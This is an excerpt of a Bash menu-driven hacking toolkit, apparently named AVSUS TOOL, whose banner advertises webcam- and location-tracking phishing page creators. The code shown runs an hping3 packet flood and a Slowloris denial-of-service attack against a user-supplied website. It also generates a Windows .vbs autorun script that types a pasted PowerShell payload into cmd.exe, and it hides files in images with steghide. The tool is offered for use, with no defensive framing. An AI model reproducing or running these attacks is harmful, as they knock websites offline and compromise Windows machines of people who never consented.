...
user=$(hostname)
atv="
[ + ] VERSION DETAILS: STABLE
[ + ] FIXED 35,36,37, 38 AND 39 COMMAND BUGS
[ + ] NEW UI
[ + ] NEW FEATURES:
ADDED WEBCAM HACKING PHISING PAGE CREATOR
ADDED LOCATION TRACKING PHISING PAGE CREATOR
ADDED STEGTHIDE OPTION
ADDED BOMBER TOOL [BETA]
"
...
J A I   H I N D 🙏$m"
	...
	if ! command -v hping3 &> /dev/null; then
	    read -p "[ - ] hping3 is not installed. Do you want to install it? (y/n)" install_choice

	    if [ "$install_choice" == "y" ]; then
		# Install hping3 using the appropriate package manager
		if [ -x "$(command -v apt-get)" ]; then
		    sudo apt-get install hping3
		elif [ -x "$(command -v yum)" ]; then
		    sudo yum install hping3
		else
		    echo "[ - ] Unsupported package manager. Please install hping3 manually."
		    exit 1
		fi
	    else
		echo "[ + ] HPING FOUND."
	...
	read -p "[ + ] ENTER YOUR WEBSITE (e.g., https://example.com):" website_url

	# Extract the domain name from the URL
	domain_name=$(echo "$website_url" | awk -F[/:] '{print $4}')

	if [ -z "$domain_name" ]; then
	    echo "[ + ] Could not extract the domain name from the URL."
	    exit 1
	fi

	# Resolve the domain's IP address
	website_ip=$(dig +short "$domain_name")

	if [ -z "$website_ip" ]; then
	    echo "[ + ] Could not resolve the IP address for $domain_name."
	    exit 1
	else
	    echo "[ + ] WEBSITE IP ==> $website_ip"
	fi

	echo "[ 1 ] UNLIMITED PACKETS"
	echo "[ 2 ] SET YOUR AMOUNT"
	read -p "[ + ] ENTER YOUR PACKETS AMMOUNT:" choice

	if [ "$choice" == "1" ]; then
	    echo "[ + ] Sending unlimited packets to $domain_name..."
	    sudo hping3 -i 0 -V "$website_ip"
	elif [ "$choice" == "2" ]; then
	    read -p "[ + ] ENTER YOUR PACKETS:" packet_count
	    echo "[ + ] Sending $packet_count packets to $domain_name..."
	    sudo hping3 -c "$packet_count" "$website_ip"
	else
	...
	echo "[ 1 ] LAUNCH SLOWLORIS ATTACK"
	read -p "[ + ] ENTER YOUR CHOICE:" choice

	if [ "$choice" == "1" ]; then
	    # Specify the full path to slowloris.py
	    read -p "[ + ] ENTER DESTINATION OF SLOWLORIS FILE MANULALLY:" slowloris
	    slowloris_script="$slowloris"  # Replace with the actual path
	    
	    if [ -f "$slowloris_script" ]; then
		echo "[ + ] Launching Slowloris attack on $domain_name..."
		python "$slowloris_script" -dns "$domain_name"
	    else
		echo "[ - ] Slowloris.py not found. Please provide the correct path."
	    fi
	else
	    echo "[ + ] Invalid choice. Exiting."
	fi
        ;;
        37)
        echo "ABOUT THIS:WINDOWS AUTORUNNER .VBS FILE WRITER
        THIS CODE CAN AUTORUN A SOFWARE AND CAN BE USED FOR HACKING FOR WINDOWS
        [ + ] PUT cmd.exe
        [ + ] TAKE A POWERSHELL UNDETECTABLE COMMAND PAYLOAD WRITTEN BY VILLAIN TOOL AND PASTE IT IN 2
        [ + ] THANKYOU
        
        [ + ] PAYLOAD FOR: WINDOWS
        [ + ] EXTENTION: .vbs
        [ + ] INFO: PAYLOAD THAT AUTORUN IN WINDOWS
        [ + ] USAGE: CAN BE USED TO EXPLOIT A WINDOWS"
        
        read -p "[ 1 ] APPLICATION TO START:" appdta
        read -p "[ 2 ] ENTER YOUR COMMAND TO APPLY:" hackingcmd
        read -p "[ + ] ENTER YOUR WINDOW NAME:" msgbosx
        read -p "[ + ] ENTER WHICH BUTTON TO PRESS:" button1
        read -p "[ + ] ENTER WHICH BUTTON (LAST) TO PRESS:" button2
        echo -e "
[ + ] SCRIPT GENERATED:
...
x.run "$appdta"
wscript.sleep 3000
x.sendkeys "$hackingcmd"
wscript.sleep 1000
x.sendkeys "{$button1}"
x.sendkeys "{$button2}"
MsgBox "$msgbosx", vbInformation, "GENERATED BY $ AVSUS TOOL""
        ;;
        38)
        main_menu
        ;;
...
if ! command -v steghide &> /dev/null; then
    echo "$sos STEGHIDE IS NOT INSTALLED, INSTALLING..."
    sudo apt install steghide
    fi
        echo "INBETA"
        read -p "ENTER YOUR IMAGE DESTINATION:" newimg
        echo "IMAGE: $newimg"
        read -p "ENTER YOUR .TXT FILE DESTINATION:" dest
        echo "COMBINING FILE: $dest"
        read -p "ENTER YOUR PASSWORD TO PROTECT YOUR FILE:" impass
        echo "PASSWORD OF FILE: $impass"
        steghide --embed -ef $dest -cf $newimg -sf AVSIMAGE.jpg -p $impass
        ;;
        "cd ..")
        dir=$(pwd)
        cd ..
...
or downloading a file from an untrusted source. Once malware is installed on a computer,
 it can steal data, install other malware, or disrupt operations."
	...
	*)
	    ...
	    read -p "[ ? ] HAVING TROUBLE?, DO YOU WANT TO SEARCH THE QUERY ON THE INTERNET: [Y/N] " choice

	    if [ "$choice" = "y" ]; then
		read -p "[ + ] PLEASE REPHRASE YOUR QUESTION:" rpr
		echo "You asked: $rpr"  # Echo the query in the terminal
		encoded_query=$(python -c "import urllib.parse; print(urllib.parse.quote('$rpr'+' AVSUS TOOL'))")
		xdg-open "https://www.google.com/search?q=$encoded_query"  # Opens in the default browser
		echo " Searching the internet for: $rpr"  # Confirmation of the search
	    elif [ "$choice" = "n" ]; then
		echo "[ + ] PROCEEDING..."
	    else
		echo "Please enter 'y' to search or 'n' to exit."
	    fi
	    ;;
    esac
}
while true; do
  current_directory=$(pwd)
  echo -e "\n\n"
  echo -e "\033[34m┌──[$name㉿$user]-[$current_directory]-[$version ★ $bos]-[PRIMARY]-(USER ╳ $username)\033[0m"
  read -p "└──[$] " input 
  process_input "$input"
  ...
  if [ "$current_directory" != "$old_directory" ]; then
    ...
    echo -e "\n\n"
    echo -e "\033[34m┌──[$name㉿$user]-[$current_directory]-[$version ★ $bos]-[SECONDARY]-(USER ╳ $username)\033[0m"
  fi
done
